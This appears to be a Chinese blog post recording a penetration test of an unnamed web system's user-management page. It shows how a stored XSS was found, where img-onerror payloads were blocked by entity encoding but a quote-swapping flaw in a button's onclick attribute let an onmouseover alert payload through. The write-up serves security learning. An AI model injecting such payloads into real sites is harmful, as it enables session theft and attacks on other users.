---
layout: post
title:  记一次测试-二次XSS
category:
- web
tags:
- web
- xss
---
### 某系统测试

1. 登录后可以添加用户名称、应用用户等

   ![](/uploads/img/xss/1.png)

2. F12 查看下这两列，是个<td>标签。第一次尝试：对用户名称 aaaa输入处 构造

   ``` html
   <td style="width:96px;display: table-cell;" id="userDisplayName" align="left">aaaaa</td>
   ```

    构造个标签闭合，用户名称、应用用户分别上传如下

    ``` html
    </td><img src='1' onerror='alert(/1/)'><td>
    </td><img src='1' onerror='alert(/2/)'><td>
    ```

3. 上传上去再看，没触发

   ![](/uploads/img/xss/2.png)
    右键编辑html，才发现实体编码了，凉凉。。。
    ``` html
    <td style="width:96px;display: table-cell;" id="userDisplayName" align="left">&lt;/td&gt;&lt;img&nbsp;src='1'&nbsp;onerror='alert(/1/)'&gt;&lt;td&gt;</td>
    ```
    突然间发现，怎么这一行的`应用授权`多了几个符号，好像还错位了，柳暗花明又一村，估计有戏，再看下这部分的编码，有点意思
    ``` html
    <button onclick="javascript:window.location.href=&quot;/tyfwfw/dap/privilege/index.jsp?userId=24685f4b-9c9d-4381-8679-41b66fbd8da3&amp;userName=</td><img src=" 1'="" onerror="alert(/2/)">"'&gt;应用授权</button>
    ```
    原来`href=`中的链接`userName`参数是从应用用户中取值，并且还把单引号替换成了双引号，结果双引号和前面 onclick= 事件的第一个双引号闭合了。
4. 二次构造，应用用户即userName中给值，`aa'/onmouseover='alert(/00xss3/)'`，其中单引号从数据库读出来的时候会被替换成双引号， aa 后面的双引号用来跟`onclick="`的引号闭合，然后对button注册个onmouseover 事件，上传下试试，bingo，成功；
   ![](/uploads/img/xss/3.png)
   看下这次构造出来的编码
    ``` html
    <button onclick="javascript:window.location.href=&quot;/tyfwfw/dap/privilege/index.jsp?userId=218f3ebc-1bb2-4a46-9a58-263878ec1e0d&amp;userName=aa" onmouseover="alert(/00xss3/)" "'="">应用授权</button>
    ```
    标签里面的错误属性好像给忽略掉了，然后又试了下，去掉后面的`</button>`不闭合，浏览器渲染还是没问题
    ``` html
    <button onclick="javascript:window.location.href=&quot;/tyfwfw/dap/privilege/index.jsp?userId=218f3ebc-1bb2-4a46-9a58-263878ec1e0d&amp;userName=aa" onmouseover="alert(/00xss3/)" "'="">应用授权</button>
    ```
    这部分浏览器对便签的处理还需要再熟悉下。。。